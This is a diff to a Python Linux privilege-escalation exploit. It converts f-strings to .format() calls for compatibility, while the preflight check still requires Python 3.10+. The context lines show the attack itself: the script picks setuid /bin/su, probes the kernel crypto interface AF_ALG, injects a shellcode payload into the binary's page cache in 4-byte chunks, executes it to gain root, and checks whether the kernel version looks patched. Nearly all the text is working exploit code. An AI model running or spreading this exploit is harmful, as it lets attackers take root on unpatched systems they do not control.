@@ -43,7 +43,8 @@ MSG_MORE = 32768  # 0x8000
 DEFAULT_TARGETS = ("/bin/su", "/usr/bin/su")
 
 
-def hexbytes(s: str) -> bytes:
+def hexbytes(s):
+    """Convert hex string to bytes"""
     return bytes.fromhex(s)
 
 
@@ -58,9 +59,9 @@ def find_target(preferred=None):
         if os.path.exists(path):
             mode = os.stat(path).st_mode
             if mode & 0o4000:
-                print(f"[*] Setuid target selected: {path} (mode={oct(mode)})")
+                print("[*] Setuid target selected: {} (mode={})".format(path, oct(mode)))
                 return path
-            print(f"[!] {path} exists but is NOT setuid ({oct(mode)})")
+            print("[!] {} exists but is NOT setuid ({})".format(path, oct(mode)))
     print("[-] FATAL: No suitable setuid target found.")
     sys.exit(1)
 
@@ -70,14 +71,16 @@ def preflight_checks(verbose=False):
     print("[*] Running pre-flight checks ...")
 
     if sys.version_info < (3, 10):
-        print(f"[-] Python {sys.version_info.major}.{sys.version_info.minor} too old (need 3.10+).")
+        print("[-] Python {}.{} too old (need 3.10+).".format(
+            sys.version_info.major, sys.version_info.minor))
         return False
     if verbose:
-        print(f"[+] Python {sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")
+        print("[+] Python {}.{}.{}".format(
+            sys.version_info.major, sys.version_info.minor, sys.version_info.micro))
 
     try:
         release = os.uname().release
-        print(f"[*] Kernel release: {release}")
+        print("[*] Kernel release: {}".format(release))
     except Exception:
         pass
 
@@ -86,7 +89,7 @@ def preflight_checks(verbose=False):
         probe.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
         probe.close()
     except OSError as exc:
-        print(f"[-] AF_ALG probe failed: {exc}")
+        print("[-] AF_ALG probe failed: {}".format(exc))
         print("    Kernel may be patched or AF_ALG is disabled (initcall_blacklist?).")
         return False
 
@@ -161,7 +164,8 @@ def write4(target_fd, offset, chunk, max_retries=3):
 
         except OSError as exc:
             if attempt == max_retries:
-                print(f"[-] write4(offset={offset}) failed after {max_retries} attempts: {exc}")
+                print("[-] write4(offset={}) failed after {} attempts: {}".format(
+                    offset, max_retries, exc))
                 return False
             time.sleep(0.05 * attempt)
         finally:
@@ -184,11 +188,11 @@ def exploit(target_path, verbose=False):
     payload = build_payload()
     payload_len = len(payload)
     num_chunks = (payload_len + 3) // 4
-    print(f"[*] Payload size: {payload_len} bytes ({num_chunks} chunks)")
+    print("[*] Payload size: {} bytes ({} chunks)".format(payload_len, num_chunks))
 
     fd = os.open(target_path, os.O_RDONLY)
     try:
-        print(f"[*] Injecting into page cache of {target_path} ...")
+        print("[*] Injecting into page cache of {} ...".format(target_path))
         for i in range(0, payload_len, 4):
             chunk = payload[i:i + 4]
             if len(chunk) < 4:
@@ -196,23 +200,24 @@ def exploit(target_path, verbose=False):
 
             ok = write4(fd, i, chunk)
             if not ok:
-                print(f"[-] Exploit failed at chunk {i // 4 + 1}/{num_chunks}.")
+                print("[-] Exploit failed at chunk {}/{}.".format(i // 4 + 1, num_chunks))
                 return False
 
             if verbose and (i // 4) % 8 == 7:
-                print(f"    ... injected chunk {i // 4 + 1}/{num_chunks}")
+                print("    ... injected chunk {}/{}".format(i // 4 + 1, num_chunks))
 
             if (i // 4) % 4 == 3:
                 time.sleep(0.02)
 
-        print(f"[+] Payload injection complete ({num_chunks} chunks written).")
+        print("[+] Payload injection complete ({} chunks written).".format(num_chunks))
     finally:
         os.close(fd)
 
-    print(f"[*] Executing {target_path} to trigger payload ...")
+    print("[*] Executing {} to trigger payload ...".format(target_path))
     ret = os.system(target_path)
     if ret != 0:
-        print(f"[!] '{target_path}' exited with code {ret}, shellcode may still have fired.")
+        print("[!] '{}' exited with code {}, shellcode may still have fired.".format(
+            target_path, ret))
 
     if os.geteuid() == 0:
         print("[+] SUCCESS: Running as root.")
@@ -283,7 +288,7 @@ def main():
             or (major == 6 and minor == 18 and patch >= 22)
         )
         if looks_patched:
-            print(f"[!] WARNING: Kernel {rel} appears patched (>= 6.19.12 / >= 6.18.22 / >= 7.0).")
+            print("[!] WARNING: Kernel {} appears patched (>= 6.19.12 / >= 6.18.22 / >= 7.0).".format(rel))
     except Exception:
         pass
 
